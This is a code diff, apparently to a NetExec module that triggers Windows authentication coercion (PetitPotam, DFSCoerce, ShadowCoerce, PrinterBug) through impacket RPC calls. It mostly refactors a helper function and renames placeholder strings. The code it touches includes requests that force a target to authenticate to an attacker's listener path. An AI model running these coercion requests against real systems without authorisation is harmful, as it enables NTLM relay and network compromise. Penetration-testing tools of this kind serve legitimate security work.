@@ -1,4 +1,5 @@
 from impacket.dcerpc.v5 import transport, rprn, even, epm
+from impacket.dcerpc.v5.rrp import DCERPCSessionError  # ruff: ignore[unused-import] solves an issue with error handling of impacket not displaying the correct exception
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUniConformantArray, NDRPOINTERNULL
 from impacket.dcerpc.v5.dtypes import LPBYTE, USHORT, LPWSTR, DWORD, ULONG, NULL, WSTR, LONG, BOOL, PCHAR, RPC_SID
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
@@ -212,14 +213,14 @@ class NXCModule:
             context.log.error("Invalid method, please check the method name.")
             return
 
-    @staticmethod
-    def get_dynamic_endpoint(interface: bytes, target: str, timeout: int = 5) -> str:
-        string_binding = rf"ncacn_ip_tcp:{target}[135]"
-        rpctransport = transport.DCERPCTransportFactory(string_binding)
-        rpctransport.set_connect_timeout(timeout)
-        dce = rpctransport.get_dce_rpc()
-        dce.connect()
-        return epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
+
+def get_dynamic_endpoint(interface: bytes, target: str, timeout: int = 5) -> str:
+    string_binding = rf"ncacn_ip_tcp:{target}[135]"
+    rpctransport = transport.DCERPCTransportFactory(string_binding)
+    rpctransport.set_connect_timeout(timeout)
+    dce = rpctransport.get_dce_rpc()
+    dce.connect()
+    return epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
 
 
 class ShadowCoerceTrigger:
@@ -397,8 +398,8 @@ class DFSCoerceTrigger:
             """
             request["ServerName"] = f"{listener}\x00"
             request["RootShare"] = "test\x00"
-            request["Comment"] = "lodos\x00"
-            request["Share"] = "x:\\lodos2005\x00"
+            request["Comment"] = "test\x00"
+            request["Share"] = "x:\\test\x00"
 
             dce.request(request)
         except Exception as e:
@@ -419,7 +420,7 @@ class DFSCoerceTrigger:
             request["pDfsPath"] = f"\\\\{listener}\\a\x00"
             request["pTargetPath"] = NULL
             request["MajorVersion"] = 0
-            request["pComment"] = "lodos\x00"
+            request["pComment"] = "test\x00"
             request["NewNamespace"] = 0
             request["Flags"] = 0
             dce.request(request)
@@ -482,7 +483,7 @@ class DFSCoerceTrigger:
             request = NetrDfsAddStdRoot()
             request["ServerName"] = f"{listener}\x00"
             request["RootShare"] = "test\x00"
-            request["Comment"] = "lodos\x00"
+            request["Comment"] = "test\x00"
             request["ApiFlags"] = 0
             dce.request(request)
         except Exception as e:
@@ -541,7 +542,7 @@ class PetitPotamtTrigger:
         # activates EFS
         # https://specterops.io/blog/2025/08/19/will-webclient-start/
         with contextlib.suppress(Exception):
-            NXCModule.get_dynamic_endpoint(uuidtup_to_bin(("df1941c5-fe89-4e79-bf10-463657acf44d", "0.0")), target, timeout=1)
+            get_dynamic_endpoint(uuidtup_to_bin(("df1941c5-fe89-4e79-bf10-463657acf44d", "0.0")), target, timeout=1)
 
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
         rpctransport.set_dport(445)
@@ -778,11 +779,12 @@ class PrinterBugTrigger:
                 "port": 445
             },
             "[dcerpc]": {
-                "stringBinding": NXCModule.get_dynamic_endpoint(uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")), target),
                 "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                 "port": None
             }
         }
+        if pipe == "[dcerpc]":
+            binding_params["[dcerpc]"]["stringBinding"] = get_dynamic_endpoint(uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")), target)
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
         if binding_params[pipe]["port"] is not None:
             rpctransport.set_dport(binding_params[pipe]["port"])
@@ -1082,7 +1084,7 @@ class EFS_HASH_BLOB(NDRSTRUCT):
 
 class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
     structure = (
-        ("Lenght", DWORD),
+        ("Length", DWORD),
         ("SID", RPC_SID),
         ("Hash", EFS_HASH_BLOB),
         ("Display", LPWSTR),
